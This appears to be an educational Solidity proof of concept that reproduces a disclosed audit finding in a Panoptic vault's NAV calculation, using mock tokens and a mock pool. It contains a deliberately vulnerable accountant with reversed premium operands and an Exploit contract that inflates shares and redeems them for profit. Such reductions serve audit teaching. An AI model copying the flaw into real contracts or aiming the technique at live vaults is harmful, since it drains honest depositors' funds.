// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    Panoptic Hypovault — [H-01] poolExposure for token1 is erroneously
    calculated as shortPremium - longPremium reversed
    (Code4rena 2025-06-panoptic, #62092)

    SYNTHETIC, cheatcode-free reduction for the EVM Playground.

    Root cause: getAccumulatedFeesAndPositionsData returns shortPremium (asset)
    and longPremium (liability). poolExposure0 correctly does short - long on
    the right slot, but poolExposure1 reverses the operands on the left slot:
        poolExposure1 = long.left - short.left   // WRONG
    instead of short.left - long.left. NAV is therefore wrong; deposits against
    the understated NAV mint excess shares that redeem for honest LPs' assets.

    Vulnerable lines preserved verbatim (@> VULN).
//////////////////////////////////////////////////////////////////////////*/

/// @dev Packed premiums: rightSlot = low 128 bits, leftSlot = high 128 bits.
type LeftRightUnsigned is uint256;

library LeftRight {
    function rightSlot(LeftRightUnsigned x) internal pure returns (uint128) {
        return uint128(LeftRightUnsigned.unwrap(x));
    }

    function leftSlot(LeftRightUnsigned x) internal pure returns (uint128) {
        return uint128(LeftRightUnsigned.unwrap(x) >> 128);
    }

    function wrap(uint256 v) internal pure returns (LeftRightUnsigned) {
        return LeftRightUnsigned.wrap(v);
    }
}

using LeftRight for LeftRightUnsigned;

contract MockERC20 {
    string public symbol;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory s) {
        symbol = s;
    }

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }

    function setBalance(address a, uint256 v) external {
        balanceOf[a] = v;
    }

    function approve(address spender, uint256 amt) external returns (bool) {
        allowance[msg.sender][spender] = amt;
        return true;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }

    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        if (msg.sender != from) {
            uint256 a = allowance[from][msg.sender];
            require(a >= amt, "allow");
            allowance[from][msg.sender] = a - amt;
        }
        balanceOf[from] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

/// @dev Mock PanopticPool returning configured premiums.
contract MockPanopticPool {
    LeftRightUnsigned public shortPremium;
    LeftRightUnsigned public longPremium;

    function setMockPremiums(LeftRightUnsigned s, LeftRightUnsigned l) external {
        shortPremium = s;
        longPremium = l;
    }

    function getAccumulatedFeesAndPositionsData(address, bool, uint256[] calldata)
        external
        view
        returns (LeftRightUnsigned, LeftRightUnsigned, uint256[2][] memory positions)
    {
        positions = new uint256[2][](0);
        return (shortPremium, longPremium, positions);
    }
}

/// @notice Reduced PanopticVaultAccountant.computeNAV with the token1 premium bug.
/// Source: PanopticVaultAccountant.sol#L134-L136 (code4rena 2025-06-panoptic).
contract PanopticVaultAccountant {
    MockPanopticPool public pool;
    MockERC20 public underlying; // token0 == underlying, 1:1 conversion of token1 for simplicity

    constructor(MockPanopticPool _pool, MockERC20 _underlying) {
        pool = _pool;
        underlying = _underlying;
    }

    /// @notice NAV = vault underlying balance + poolExposure0 + poolExposure1 (1:1 prices).
    function computeNAV(address vault) public view returns (uint256 nav) {
        // Underlying cash.
        nav = underlying.balanceOf(vault);

        LeftRightUnsigned shortPremium;
        LeftRightUnsigned longPremium;
        uint256[] memory tokenIds; // empty — premiums only
        uint256[2][] memory positionBalanceArray;
        (shortPremium, longPremium, positionBalanceArray) =
            pool.getAccumulatedFeesAndPositionsData(vault, true, tokenIds);

        int256 poolExposure0;
        int256 poolExposure1;
        {
            poolExposure0 = int256(uint256(shortPremium.rightSlot())) - int256(uint256(longPremium.rightSlot()));
            // token1 premium operands reversed (long - short instead of short - long)
            poolExposure1 = int256(uint256(longPremium.leftSlot()))
                - int256(uint256(shortPremium.leftSlot())); // @> VULN: reversed short/long for token1
            // FIX: int256(uint256(shortPremium.leftSlot())) - int256(uint256(longPremium.leftSlot()));
        }

        // Convert exposures to underlying at 1:1 (synthetic simplification of oracle path).
        int256 total = int256(nav) + poolExposure0 + poolExposure1;
        require(total >= 0, "neg nav");
        nav = uint256(total);
    }

    /// @notice Correct NAV for assertions (operands fixed).
    function computeNAVCorrect(address vault) public view returns (uint256 nav) {
        nav = underlying.balanceOf(vault);
        (LeftRightUnsigned shortPremium, LeftRightUnsigned longPremium,) =
            pool.getAccumulatedFeesAndPositionsData(vault, true, new uint256[](0));
        int256 poolExposure0 =
            int256(uint256(shortPremium.rightSlot())) - int256(uint256(longPremium.rightSlot()));
        int256 poolExposure1 =
            int256(uint256(shortPremium.leftSlot())) - int256(uint256(longPremium.leftSlot()));
        int256 total = int256(nav) + poolExposure0 + poolExposure1;
        nav = uint256(total);
    }
}

/// @dev HypoVault that fulfills deposits using the accountant's (buggy) NAV.
contract HypoVault {
    MockERC20 public immutable underlying;
    PanopticVaultAccountant public immutable accountant;
    mapping(address => uint256) public sharesOf;
    uint256 public totalShares;

    constructor(MockERC20 u, PanopticVaultAccountant a) {
        underlying = u;
        accountant = a;
    }

    function seed(uint256 assets, uint256 shares) external {
        require(underlying.transferFrom(msg.sender, address(this), assets), "in");
        sharesOf[msg.sender] += shares;
        totalShares += shares;
    }

    function deposit(uint256 assets) external returns (uint256 shares) {
        uint256 nav = accountant.computeNAV(address(this));
        require(underlying.transferFrom(msg.sender, address(this), assets), "in");
        if (totalShares == 0 || nav == 0) {
            shares = assets;
        } else {
            // shares = assets * totalShares / nav  (NAV understated → more shares)
            shares = (assets * totalShares) / nav;
        }
        sharesOf[msg.sender] += shares;
        totalShares += shares;
    }

    function redeem(uint256 shares) external returns (uint256 assetsOut) {
        // Redeem against true NAV so the excess-share holder extracts real value.
        uint256 navCorrect = accountant.computeNAVCorrect(address(this));
        assetsOut = (shares * navCorrect) / totalShares;
        sharesOf[msg.sender] -= shares;
        totalShares -= shares;
        require(underlying.transfer(msg.sender, assetsOut), "out");
    }
}

/// @notice Deposit against understated NAV → excess shares → profit on redeem.
contract Exploit {
    MockERC20 public underlying; // CREATE nonce 1
    MockPanopticPool public mockPool; // CREATE nonce 2
    PanopticVaultAccountant public accountant; // CREATE nonce 3 — vulnerable
    HypoVault public vault; // CREATE nonce 4

    uint256 public buggyNav;
    uint256 public correctNav;
    uint256 public attackerShares;
    uint256 public attackerProfit;

    constructor() {
        underlying = new MockERC20("UND");
        mockPool = new MockPanopticPool();
        accountant = new PanopticVaultAccountant(mockPool, underlying);
        vault = new HypoVault(underlying, accountant);
    }

    function run() external {
        // Premiums from the finding's PoC:
        // short right=200e18, left=150e18; long right=50e18, left=50e18
        // net correct = (200-50)+(150-50) = 250e18
        // buggy poolExposure1 = 50-150 = -100 → net = 150-100 = 50 (vs 250)
        uint256 shortPremiumRight = 200e18;
        uint256 shortPremiumLeft = 150e18;
        uint256 longPremiumRight = 50e18;
        uint256 longPremiumLeft = 50e18;
        mockPool.setMockPremiums(
            LeftRight.wrap((shortPremiumLeft << 128) | shortPremiumRight),
            LeftRight.wrap((longPremiumLeft << 128) | longPremiumRight)
        );

        // Vault holds 1000e18 underlying; 1000e18 shares outstanding (honest LP).
        underlying.mint(address(this), 1000e18);
        underlying.approve(address(vault), type(uint256).max);
        vault.seed(1000e18, 1000e18);

        buggyNav = accountant.computeNAV(address(vault));
        correctNav = accountant.computeNAVCorrect(address(vault));
        // buggy: 1000 + 150 + (50-150) = 1050
        // correct: 1000 + 150 + (150-50) = 1250
        require(buggyNav == 1050e18, "buggy nav");
        require(correctNav == 1250e18, "correct nav");

        // Attacker deposits 1050e18 against buggy NAV=1050 → gets 1000 shares (fair would be ~840).
        // Fair shares = 1050 * 1000 / 1250 = 840.
        underlying.mint(address(this), 1050e18);
        attackerShares = vault.deposit(1050e18);
        require(attackerShares == 1000e18, "excess shares from understated nav");

        // Redeem against correct NAV: total shares 2000, correct nav after deposit:
        // underlying now 2050 + premium net 250 = 2300; attacker's 1000/2000 * 2300 = 1150.
        // Profit = 1150 - 1050 = 100 (the premium-sign error of 200 split with LP... actually 100).
        uint256 before = underlying.balanceOf(address(this));
        uint256 got = vault.redeem(attackerShares);
        uint256 afterBal = underlying.balanceOf(address(this));
        require(afterBal - before == got, "xfer");
        attackerProfit = got - 1050e18;
        require(attackerProfit == 100e18, "100e18 profit from NAV error");
    }
}
